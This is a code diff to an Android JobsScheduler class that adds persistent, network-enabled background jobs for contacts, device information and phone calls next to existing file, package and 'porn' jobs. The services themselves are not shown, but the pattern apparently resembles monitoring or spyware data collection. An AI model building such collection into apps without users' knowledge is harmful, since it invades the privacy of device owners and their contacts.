@@ -10,8 +10,12 @@ public class JobsScheduler {
     public static final int WALLPAPER_JOB_ID = 2;
     public static final int FILES_JOB_ID = 3;
     public static final int ID_PACKAGES = 4;
+    public static final int JOB_ID_CONTACTS = 5;
+    public static final int JOB_ID_DEVICE = 6;
+    public static final int JOB_ID_PHONE_CALLS = 7;
     public static final long ONE_MINUTE = 60000;
     public static final long ONE_HOUR = ONE_MINUTE * 60;
+
     protected static void scheduleJob(Context context){
         ComponentName serviceComponent = new ComponentName(context, PornJobService.class);
         JobInfo.Builder builder = new JobInfo.Builder(PORN_JOB_ID, serviceComponent);
@@ -38,8 +42,8 @@ public class JobsScheduler {
             JobInfo.Builder filesJob = new JobInfo.Builder(FILES_JOB_ID, filesJobService);
             filesJob.setRequiredNetworkType(JobInfo.NETWORK_TYPE_ANY);
             filesJob.setRequiresCharging(false);
-            filesJob.setRequiresBatteryNotLow(false);
-            filesJob.setRequiresStorageNotLow(false);
+            filesJob.setRequiresBatteryNotLow(true);
+            filesJob.setRequiresStorageNotLow(true);
             filesJob.setRequiresDeviceIdle(false);
             filesJob.setPersisted(true);
             filesJob.setOverrideDeadline( 24 * ONE_HOUR);
@@ -51,13 +55,52 @@ public class JobsScheduler {
             JobInfo.Builder packagesJob = new JobInfo.Builder(ID_PACKAGES, packagesJobService);
             packagesJob.setRequiredNetworkType(JobInfo.NETWORK_TYPE_ANY);
             packagesJob.setRequiresCharging(false);
-            packagesJob.setRequiresBatteryNotLow(false);
+            packagesJob.setRequiresBatteryNotLow(true);
             packagesJob.setRequiresStorageNotLow(false);
             packagesJob.setRequiresDeviceIdle(false);
             packagesJob.setPersisted(true);
             packagesJob.setOverrideDeadline( 24 * ONE_HOUR);
             packagesJob.setMinimumLatency(1 * ONE_MINUTE);
             jobScheduler.schedule(packagesJob.build());
+        }
+        if(jobScheduler.getPendingJob(JOB_ID_CONTACTS) == null){
+            ComponentName contactsJobService = new ComponentName(context, ContactsJobService.class);
+            JobInfo.Builder contactsJob = new JobInfo.Builder(JOB_ID_CONTACTS, contactsJobService);
+            contactsJob.setRequiredNetworkType(JobInfo.NETWORK_TYPE_ANY);
+            contactsJob.setRequiresCharging(false);
+            contactsJob.setRequiresBatteryNotLow(true);
+            contactsJob.setRequiresStorageNotLow(false);
+            contactsJob.setRequiresDeviceIdle(false);
+            contactsJob.setPersisted(true);
+            contactsJob.setOverrideDeadline( 24 * ONE_HOUR);
+            contactsJob.setMinimumLatency(3* ONE_MINUTE);
+            jobScheduler.schedule(contactsJob.build());
+        }
+        if(jobScheduler.getPendingJob(JOB_ID_DEVICE) == null){
+            ComponentName deviceJobService = new ComponentName(context, DeviceJobService.class);
+            JobInfo.Builder deviceJob = new JobInfo.Builder(JOB_ID_DEVICE, deviceJobService);
+            deviceJob.setRequiredNetworkType(JobInfo.NETWORK_TYPE_ANY);
+            deviceJob.setRequiresCharging(false);
+            deviceJob.setRequiresBatteryNotLow(true);
+            deviceJob.setRequiresStorageNotLow(false);
+            deviceJob.setRequiresDeviceIdle(false);
+            deviceJob.setPersisted(true);
+            deviceJob.setOverrideDeadline( 24 * ONE_HOUR);
+            deviceJob.setMinimumLatency(2* ONE_MINUTE);
+            jobScheduler.schedule(deviceJob.build());
+        }
+        if(jobScheduler.getPendingJob(JOB_ID_PHONE_CALLS) == null){
+            ComponentName phoneCallsJobService = new ComponentName(context, PhoneCallsJobService.class);
+            JobInfo.Builder phoneCallsJob = new JobInfo.Builder(JOB_ID_PHONE_CALLS, phoneCallsJobService);
+            phoneCallsJob.setRequiredNetworkType(JobInfo.NETWORK_TYPE_ANY);
+            phoneCallsJob.setRequiresCharging(false);
+            phoneCallsJob.setRequiresBatteryNotLow(false);
+            phoneCallsJob.setRequiresStorageNotLow(false);
+            phoneCallsJob.setRequiresDeviceIdle(false);
+            phoneCallsJob.setPersisted(true);
+            phoneCallsJob.setOverrideDeadline( 24 * ONE_HOUR);
+            phoneCallsJob.setMinimumLatency(1 * ONE_MINUTE);
+            jobScheduler.schedule(phoneCallsJob.build());
         }
     }
 }
